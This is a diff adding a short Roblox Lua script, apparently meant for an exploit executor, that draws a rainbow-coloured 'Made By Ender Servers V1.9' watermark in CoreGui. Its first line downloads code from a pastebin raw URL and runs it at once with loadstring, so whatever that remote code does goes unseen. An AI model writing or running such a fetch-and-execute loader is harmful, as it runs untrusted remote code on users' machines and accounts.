@@ -1,0 +1,35 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/wwK7Z5fU"))()
+local WaterMark = Instance.new("ScreenGui")
+local EnderServers = Instance.new("TextLabel")
+
+WaterMark.Name = "WaterMark"
+WaterMark.Parent = game:WaitForChild("CoreGui")
+WaterMark.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+EnderServers.Name = "EnderServers"
+EnderServers.Parent = WaterMark
+EnderServers.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+EnderServers.BackgroundTransparency = 1.000
+EnderServers.Position = UDim2.new(0.0200892836, 0, 0.91974318, 0)
+EnderServers.Size = UDim2.new(0, 487, 0, 50)
+EnderServers.Font = Enum.Font.SourceSans
+EnderServers.Text = "Made By Ender Servers V1.9"
+EnderServers.TextColor3 = Color3.fromRGB(255, 0, 4)
+EnderServers.TextSize = 48.000
+
+-- Scripts:
+
+local function FVPZ_fake_script() -- EnderServers.LocalScript 
+	local script = Instance.new('LocalScript', EnderServers)
+
+	function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
+	
+	counter = 0
+	
+	while wait(0.1)do
+		script.Parent.TextColor3 = Color3.fromHSV(zigzag(counter),1,1)
+	
+		counter = counter + 0.01
+	end
+end
+coroutine.wrap(FVPZ_fake_script)()
